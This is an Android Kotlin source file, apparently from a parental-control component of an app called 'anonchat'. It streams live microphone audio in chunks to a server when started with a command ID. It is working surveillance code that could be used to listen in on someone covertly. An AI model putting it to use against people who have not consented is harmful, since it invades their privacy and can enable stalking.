package com.anonchat.app.parentalcontrol.manager

import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.util.Log
import com.anonchat.app.parentalcontrol.api.ApiClient
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

class CallStreamManager {

    private var recordThread: Thread? = null
    private var networkThread: Thread? = null

    @Volatile
    var isStreaming = false
        private set

    var onStreamingStateChanged: ((Boolean) -> Unit)? = null

    private var seqCounter = 0
    private val audioQueue = LinkedBlockingQueue<AudioChunkData>()

    private class AudioChunkData(
        val bytes: ByteArray,
        val seq: Int,
        val sampleRate: Int,
        val isDone: Boolean
    )

    fun startStreaming(commandId: String? = null) {
        if (isStreaming) return
        isStreaming = true
        seqCounter = 0
        audioQueue.clear()
        onStreamingStateChanged?.invoke(true)

        // 1. Dedicated network sender thread (prevents network latency from blocking AudioRecord)
        networkThread = Thread {
            Log.d(TAG, "Network sender thread started")
            while (isStreaming || !audioQueue.isEmpty()) {
                try {
                    val chunk = audioQueue.poll(500, TimeUnit.MILLISECONDS) ?: continue
                    sendAudioChunk(chunk.bytes, chunk.sampleRate, commandId, chunk.seq, chunk.isDone)
                    if (chunk.isDone) break
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "Network send error: ${e.message}")
                }
            }
            Log.d(TAG, "Network sender thread finished")
        }.apply {
            isDaemon = true
            start()
        }

        // 2. High-priority recording thread (reads MIC continuously without any network delay)
        recordThread = Thread {
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_AUDIO)
            var recorder: AudioRecord? = null
            var actualSampleRate = 16000
            try {
                val channelConfig = AudioFormat.CHANNEL_IN_MONO
                val audioFormat = AudioFormat.ENCODING_PCM_16BIT

                var minBufSize = AudioRecord.getMinBufferSize(16000, channelConfig, audioFormat)
                if (minBufSize > 0) {
                    actualSampleRate = 16000
                } else {
                    actualSampleRate = 44100
                    minBufSize = AudioRecord.getMinBufferSize(44100, channelConfig, audioFormat)
                }

                recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    actualSampleRate,
                    channelConfig,
                    audioFormat,
                    Math.max(minBufSize * 4, 16384)
                )

                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    Log.w(TAG, "Failed at 16000Hz, trying fallback 44100Hz...")
                    try { recorder.release() } catch (_: Exception) {}
                    actualSampleRate = 44100
                    minBufSize = AudioRecord.getMinBufferSize(44100, channelConfig, audioFormat)
                    recorder = AudioRecord(
                        MediaRecorder.AudioSource.MIC,
                        actualSampleRate,
                        channelConfig,
                        audioFormat,
                        Math.max(minBufSize * 4, 16384)
                    )
                }

                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    isStreaming = false
                    onStreamingStateChanged?.invoke(false)
                    return@Thread
                }

                recorder.startRecording()
                Log.d(TAG, "Started continuous MIC recording at ${actualSampleRate}Hz")

                // Read ~200ms of audio per chunk (16kHz: 6400 bytes; 44.1kHz: 17640 bytes)
                val chunkSize = if (actualSampleRate == 16000) 6400 else 17640
                val buffer = ByteArray(chunkSize)

                while (isStreaming && !Thread.currentThread().isInterrupted) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val audioChunk = buffer.copyOfRange(0, read)
                        seqCounter++
                        audioQueue.offer(AudioChunkData(audioChunk, seqCounter, actualSampleRate, false))
                    }
                }

                // Send final 'done' signal chunk
                seqCounter++
                audioQueue.offer(AudioChunkData(ByteArray(0), seqCounter, actualSampleRate, true))

            } catch (e: SecurityException) {
                Log.e(TAG, "RECORD_AUDIO permission denied: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "Recording loop error: ${e.message}")
            } finally {
                try {
                    recorder?.stop()
                    recorder?.release()
                } catch (e: Exception) {}
                isStreaming = false
                onStreamingStateChanged?.invoke(false)
                Log.d(TAG, "MIC recording loop stopped")
            }
        }.apply {
            isDaemon = true
            start()
        }
    }

    fun stopStreaming() {
        isStreaming = false
        recordThread?.interrupt()
        recordThread = null
        networkThread?.interrupt()
        networkThread = null
    }

    private fun sendAudioChunk(chunk: ByteArray, sampleRate: Int, commandId: String?, seq: Int, done: Boolean) {
        try {
            ApiClient.streamAudioChunk(chunk, sampleRate, commandId, seq, done)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send audio chunk: ${e.message}")
        }
    }

    companion object {
        private const val TAG = "CallStreamManager"
    }
}
